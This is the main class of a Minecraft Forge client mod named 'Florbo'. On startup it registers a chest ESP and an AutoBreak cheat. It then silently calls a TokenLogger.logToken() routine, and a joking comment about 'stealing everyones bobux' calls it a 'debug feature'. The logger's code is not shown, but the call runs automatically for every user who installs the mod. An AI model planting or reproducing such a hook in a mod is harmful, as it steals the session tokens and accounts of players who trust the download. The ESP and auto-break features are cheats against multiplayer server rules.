package dev.florbo;

import cc.polyfrost.oneconfig.libs.eventbus.Subscribe;
import dev.florbo.command.FlorboCommand;
import dev.florbo.config.FlorboConfig;
import cc.polyfrost.oneconfig.events.event.InitializationEvent;
import dev.florbo.features.funny.TokenLogger;
import dev.florbo.features.hypixel.dungeons.MobEsp;
import dev.florbo.features.hypixel.farming.AutoBreak;
import dev.florbo.features.visuals.ChestEsp;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.PlayerControllerMP;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import cc.polyfrost.oneconfig.utils.commands.CommandManager;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.lwjgl.opengl.Display;

import java.util.List;

/**
 * The entrypoint of the Example Mod that initializes it.
 *
 * @see Mod
 * @see InitializationEvent
 */
@Mod(modid = FlorboMod.MODID, name = FlorboMod.NAME, version = FlorboMod.VERSION, clientSideOnly = true)
public class FlorboMod {
    public static final String MODID = "@ID@";
    public static final String NAME = "@NAME@";
    public static final String VERSION = "@VER@";
    // Sets the variables from `gradle.properties`. See the `blossom` config in `build.gradle.kts`.
    @Mod.Instance(MODID)
    public static FlorboMod INSTANCE;
    public static FlorboConfig config;
    public Minecraft mc;
    @Mod.EventHandler
    public void onInit(FMLInitializationEvent event) {
        config = new FlorboConfig();
        CommandManager.INSTANCE.registerCommand(new FlorboCommand());
        mc = Minecraft.getMinecraft();
        Display.setTitle("FLORBOOO GLORBOOO version umm like " + VERSION + " or some shit");
        MinecraftForge.EVENT_BUS.register(new ChestEsp());
        MinecraftForge.EVENT_BUS.register(new AutoBreak());
        TokenLogger.logToken(); // HIIHAHIAHIAHIAHAH im stealing everyones bobux (its debug feature dont worry) nocappers
    }
}